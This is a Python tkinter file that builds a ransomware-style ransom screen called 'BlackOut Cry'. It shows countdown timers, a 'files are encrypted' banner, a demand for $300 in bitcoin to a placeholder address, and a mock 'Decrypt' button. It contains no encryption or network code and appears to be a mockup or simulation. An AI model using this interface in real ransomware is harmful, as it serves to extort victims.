import tkinter as tk
from tkinter import ttk, messagebox, font as tkFont
from tkinter import font
import pyperclip  # For clipboard functionality
from tkhtmlview import HTMLScrolledText  # Correct import
from PIL import Image, ImageTk

# Fake countdown time (seconds)
COUNTDOWN_TIME = 3600  # 1 hour

class RansomUI:
    def __init__(self, root):
        self.root = root
        self.root.title("BlackOut Cry")
        self.root.geometry("800x500")
        self.root.configure(bg="#841212") 
        self.center_window(800, 500)

        self.custom_font = ("DS-Digital", 24, "bold")  # Fallback font

        # Frame for left side content
        self.left_frame = tk.Frame(root, bg="#841212")
        self.left_frame.grid(row=2, column=0, padx=5, pady=0, sticky="nwse")
        self.left_frame.grid_columnconfigure(0, weight=1)

        # Image
        image_locked = Image.open("./imgs/lock.png")
        image_locked = image_locked.resize((150, 150), Image.Resampling.LANCZOS)
        photo_locked = ImageTk.PhotoImage(image_locked)
        self.image_label = tk.Label(self.left_frame, image=photo_locked, bg="#841212")
        self.image_label.image = photo_locked
        self.image_label.grid(row=1, column=0, columnspan=1, pady=0)

        # Middle Left Frame
        self.middle_left_frame = tk.Frame(self.left_frame, bg="#841212")
        self.middle_left_frame.grid(row=2, column=0, padx=0, pady=0, sticky="nsew")
        self.middle_left_frame.grid_columnconfigure(0, weight=1)

        self.box_frame_1 = tk.Frame(self.middle_left_frame, bg="#841212", bd=2, relief="solid", highlightbackground="white", highlightthickness=2)
        self.box_frame_1.pack(fill="x", expand=True, pady=5, padx=0)
        self.box_frame_1.grid_columnconfigure(0, weight=1)

        # Text and Deadline
        self.deadline_label_1 = tk.Label(self.box_frame_1, text="Payment will be raised on", fg="#c6b105", bg="#0d0d0d", font=("Arial", 14))
        self.deadline_label_1.grid(row=0, column=0, sticky="we")

        self.deadline_date_1 = tk.Label(self.box_frame_1, text="2023-12-31 23:59:59", fg="#dbe4da", bg="#0d0d0d", font=("Arial", 14))
        self.deadline_date_1.grid(row=1, column=0, sticky="we")

        self.deadline_label_time_1 = tk.Label(self.box_frame_1, text="Time Left", fg="#dbe4da", bg="#0d0d0d", font=("Arial", 14))
        self.deadline_label_time_1.grid(row=2, column=0, sticky="we")

        self.timer_label_1 = tk.Label(self.box_frame_1, text="", fg="#dbe4da", bg="#0d0d0d", font=self.custom_font)
        self.timer_label_1.grid(row=4, column=0, sticky="we")

        self.box_frame_2 = tk.Frame(self.middle_left_frame, bg="#841212", bd=2, relief="solid", highlightbackground="white", highlightthickness=2)
        self.box_frame_2.pack(fill="x", expand=True, pady=10, padx=0)
        self.box_frame_2.grid_columnconfigure(0, weight=1)

        # Text and Deadline
        self.deadline_label_2 = tk.Label(self.box_frame_2, text="Your files will be lost on", fg="#c6b105", bg="#0d0d0d", font=("Arial", 14))
        self.deadline_label_2.grid(row=0, column=0, sticky="we")

        self.deadline_date_2 = tk.Label(self.box_frame_2, text="2023-12-31 23:59:59", fg="#dbe4da", bg="#0d0d0d", font=("Arial", 14))
        self.deadline_date_2.grid(row=1, column=0, sticky="we")

        # Countdown
        self.countdown_label_2 = tk.Label(self.box_frame_2, text="Countdown:", fg="#dbe4da", bg="#0d0d0d", font=("Arial", 14))
        self.countdown_label_2.grid(row=2, column=0, sticky="we")

        self.timer_label_2 = tk.Label(self.box_frame_2, text="", fg="#dbe4da", bg="#0d0d0d", font=self.custom_font)
        self.timer_label_2.grid(row=4, column=0, sticky="we")

        # About Section with Links
        self.bottom_left_frame = tk.Frame(self.left_frame, bg="#841212")
        self.bottom_left_frame.grid(row=3, column=0, padx=5, pady=20, sticky="sw")

        self.link1 = tk.Label(self.bottom_left_frame, text="About Blackout Cry", fg="#00ff00", bg="#841212", font=("Arial", 12, "underline"), cursor="hand2")
        self.link1.grid(row=7, column=0, sticky="w")

        self.link3 = tk.Label(self.bottom_left_frame, text="Terms", fg="#00ff00", bg="#841212", font=("Arial", 12, "underline"), cursor="hand2")
        self.link3.grid(row=8, column=0, sticky="w")

        self.link2 = tk.Label(self.bottom_left_frame, text="Contact Us", fg="#00ff00", bg="#841212", font=("Arial", 14, "bold", "underline"), cursor="hand2")
        self.link2.grid(row=9, column=0, sticky="w")


        self.link2.bind("<Button-1>", lambda e: self.open_contact_form())
        self.left_frame.grid_rowconfigure(3, weight=1)

        # Frame for right side content
        self.right_frame = tk.Frame(root, bg="#841212")
        self.right_frame.grid(row=2, column=1, padx=5, pady=0, sticky="nwse")
        
        # Frame for title and combobox (to ensure they are at the top)
        self.top_right_frame = tk.Frame(self.right_frame, bg="#841212")
        self.top_right_frame.grid(row=0, column=0, columnspan=2, sticky="ew", pady=5)

        # Title Label (Cente#841212)
        self.title_label = tk.Label(self.top_right_frame, text="Ooops, your files are encrypted!", fg="#00ff00", bg="#841212", font=("Arial", 24, "bold"))
        self.title_label.grid(row=0, column=0, sticky="w", padx=10)  # Aligned to left for better spacing

        # Combobox (Right-Aligned)
        self.combo = ttk.Combobox(self.top_right_frame, values=["English", "Portuguese"], state="readonly")
        self.combo.set("English")
        self.combo.grid(row=0, column=1, sticky="e", padx=10)  # Placed at the right end

        # Ensure the right column expands so elements are positioned properly
        self.top_right_frame.columnconfigure(0, weight=1)
        self.top_right_frame.columnconfigure(1, weight=1)

        # HTMLScrolledText (Now below title & combobox)
        with open('index.html', 'r') as file:
            html_content = file.read()

        # Load the HTML content into the HTMLScrolledText widget
        self.html_label = HTMLScrolledText(self.right_frame, html=html_content, wrap="word")

        self.html_label.grid(row=1, column=0, columnspan=2, padx=0, pady=0, sticky="nsew")  # Moved to row=1
        self.html_label.config(state="disabled")

        # Box with Image and Clipboard Feature
        self.box_frame = tk.Frame(self.right_frame, bg="#841212", bd=2, highlightbackground="white", highlightthickness=2)
        self.box_frame.grid(row=4, column=0, columnspan=2, pady=5, sticky="ew")
        
        self.box_frame.grid_columnconfigure(1, weight=1)  # Expands the column
        #self.box_frame.grid_rowconfigure(0, weight=1)     # Expands the row (change the index as needed)

        # START
        # Left Frame (Image)
        self.pay_left_frame = tk.Frame(self.box_frame, bg="#841212")
        self.pay_left_frame.grid(row=0, column=0, padx=0, pady=0, sticky="we")
        self.pay_left_frame.grid_columnconfigure(0, weight=1)  # Expands the column
        #self.pay_left_frame.grid_rowconfigure(0, weight=1)     # Expands the row (change the index as needed)

        # Open the image
        image = Image.open("./imgs/mastercard.512x322.png")  # Supports PNG, JPG, etc.

        # Resize the image to fill the available space (adjust dimensions if necessary)
        image = image.resize((200, 55), Image.Resampling.LANCZOS)

        # Convert the image for use in Tkinter
        photo = ImageTk.PhotoImage(image)

        # Set the image in the label
        self.image_label = tk.Label(self.pay_left_frame, image=photo, bg="#841212")
        self.image_label.image = photo  # Keep a reference to the image

        # Configure the label to fill all available space in the parent frame
        self.image_label.pack(fill="both", expand=True, padx=0, pady=0)
        self.image_label.grid_columnconfigure(0, weight=1)


        # Right Frame
        self.pay_right_frame = tk.Frame(self.box_frame, bg="#841212")
        self.pay_right_frame.grid(row=0, column=1, padx=5, pady=0, sticky="nse")

        # Box at the Top Right
        self.pay_top_box = tk.Frame(self.pay_right_frame, bg="#841212")
        self.pay_title_label = tk.Label(self.pay_right_frame, text="Send $300 worth of bitcoin to this address", fg="#c6b105", bg="#841212", font=("Arial", 12, "bold"))
        self.pay_title_label.grid(row=0, column=0, sticky="w", padx=5, pady=5)  # Aligned to left for better spacing

        # Bottom Box (Contains Textbox and Button)
        self.pay_bottom_box = tk.Frame(self.pay_right_frame, bg="#841212")
        self.pay_bottom_box.grid(row=1, column=0, columnspan=2, pady=0, sticky="ew")

        # Read-only Textbox
        self.text_var = tk.StringVar(value="1BitcoinAddressExample12345")
        self.textbox = tk.Entry(self.pay_bottom_box, textvariable=self.text_var, font=("Arial", 12, "bold"), fg="white", state="readonly", readonlybackground="#841212", width=45)
        self.textbox.grid(row=0, column=0, padx=2, pady=0)

        # Copy Button
        self.copy_button = tk.Button(self.pay_bottom_box, text="Copy", command=self.copy_text, font=("Arial", 12), fg="black", background='#841212', highlightbackground="#841212")
        self.copy_button.grid(row=0, column=1, padx=2, pady=0)

        # Ensure grid expands properly

        # END

        # Buttons at the Bottom
        self.button_frame = tk.Frame(self.right_frame, bg="#841212")
        self.button_frame.grid(row=5, column=0, columnspan=2, pady=5, sticky="n")

        # Add the same width for both buttons
        self.check_button = tk.Button(self.button_frame, text="Check Payment", fg="#0d0d0d", bg="#00ff00", highlightbackground="#841212", font=("Arial", 12, "bold"), width=30, height=2)
        self.check_button.grid(row=0, column=0, padx=10, sticky="w")

        self.decrypt_button = tk.Button(self.button_frame, text="Decrypt", fg="#0d0d0d", bg="#ff00ff", highlightbackground="#841212", font=("Arial", 12, "bold"), command=self.fake_decrypt, width=30, height=2)
        self.decrypt_button.grid(row=0, column=1, padx=10, sticky="e")

        self.check_button.columnconfigure(1, weight=1)
        self.decrypt_button.columnconfigure(1, weight=1)

        # Timer 1
        self.time_left_1 = COUNTDOWN_TIME
        self.update_timer_1()

        # Timer 2
        self.time_left_2 = COUNTDOWN_TIME
        self.update_timer_2()

    def open_contact_form(self):
        # Create a new window for the contact form
        form_window = tk.Toplevel(self.root)
        form_window.title("Contact Form")
        
        # Create a Text widget for entering the message
        message_box = tk.Text(form_window, height=10, width=30, font=("Arial", 12))
        message_box.pack(padx=20, pady=20)
        
        # Send Button Functionality
        def send_message():
            # Here you can define what happens when the send button is clicked
            message = message_box.get("1.0", "end-1c")
            print("Message sent:", message)  # You can process the message here
            form_window.destroy()  # Close the form after sending
        
        # Cancel Button Functionality
        def cancel_form():
            form_window.destroy()  # Close the form when canceled
        
        # Send Button
        send_button = tk.Button(form_window, text="Send", fg="#00ff00", bg="#0d0d0d", font=("Arial", 12), command=send_message)
        send_button.pack(side="left", padx=20, pady=20)
        
        # Cancel Button
        cancel_button = tk.Button(form_window, text="Cancel", fg="#ff0000", bg="#0d0d0d", font=("Arial", 12), command=cancel_form)
        cancel_button.pack(side="right", padx=20, pady=20)
        
    def update_timer_1(self):
        """ Updates the countdown timer every second """
        if self.time_left_1 > 0:
            mins, secs = divmod(self.time_left_1, 60)
            hours, mins = divmod(mins, 60)
            self.timer_label_1.config(text=f"{hours:02}:{mins:02}:{secs:02}")
            self.time_left_1 -= 1
            self.root.after(1000, self.update_timer_1)

    def update_timer_2(self):
        """ Updates the countdown timer every second """
        if self.time_left_2 > 0:
            mins, secs = divmod(self.time_left_2, 60)
            hours, mins = divmod(mins, 60)
            self.timer_label_2.config(text=f"{hours:02}:{mins:02}:{secs:02}")
            self.time_left_2 -= 1
            self.root.after(1000, self.update_timer_2)

    def fake_decrypt(self):
        """ Shows a fake decryption message """
        messagebox.showinfo("Decryption Failed", "Nice try! But you still have to pay!")

    def copy_bitcoin_address(self, event=None):
        self.root.clipboard_clear()
        self.root.clipboard_append(self.text_var.get())
        self.root.update()
        messagebox.showinfo("Copied", "Bitcoin address copied to clipboard!")

    def copy_text(self):
        self.copy_bitcoin_address()

    def center_window(self, width, height):
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        x = (screen_width - width) // 2
        y = (screen_height - height) // 2
        self.root.geometry(f"{width}x{height}+{x}+{y}")

# Run the application
if __name__ == "__main__":
    root = tk.Tk()
    app = RansomUI(root)
    root.mainloop()